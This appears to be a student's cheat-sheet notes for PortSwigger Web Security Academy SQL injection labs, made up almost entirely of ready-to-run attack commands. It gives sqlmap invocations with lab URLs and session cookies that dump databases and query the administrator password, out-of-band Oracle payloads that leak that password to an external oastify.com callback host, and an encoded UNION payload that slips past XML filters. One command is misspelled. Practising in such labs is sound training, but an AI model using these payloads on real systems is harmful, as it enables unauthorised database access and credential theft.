____

[https://tib3rius.com/sqli](https://tib3rius.com/sqli) 

[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


```bash
sqlmap -u "https://0a9100e603500d0982375131006f00bc.web-security-academy.net/filter?category=Gifts" --cookie="session=7biRvfgHaUlvwd8pXfLeRYKYtYFxAkEx" --level 5 --risk 3 -p category --batch --threads 10 --dbms=postgresql --dump -D public
```


```bash
sqlmap -u "https://0a39002b04d1c3af83dc5ac4006e0063.web-security-academy.net/filter?category=test" --cookie="session=N3QaEz5GFooyaQ4CxomOPoxXWZ7PVdmH" --level 5 --risk 3 -p category --batch --threads 10 --dbms=postgresql -D public --sql-query="SELECT password from USERS where username='administrator'"
```


# TrackingId

```bash
qlmap -u "https://0aef001c04d61b8e81771771008e0081.web-security-academy.net/filter?category=test" --cookie="TrackingId=YJopvpBsdNu7Eti3" --level 5 --risk 3 -p TrackingId --batch --threads 10 --dbms=postgresql -D public --sql-query="SELECT password from USERS where username='administrator'"
```


# Out of band

```bash
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//j4ouhbvxp3hdpkybcyx189hrbih85x.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

```bash
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.j4ouhbvxp3hdpkybcyx189hrbih85x.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

# XML encoding

**Extensions > Hackvertor > Encode > dec_entities/hex_entities**.

```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```
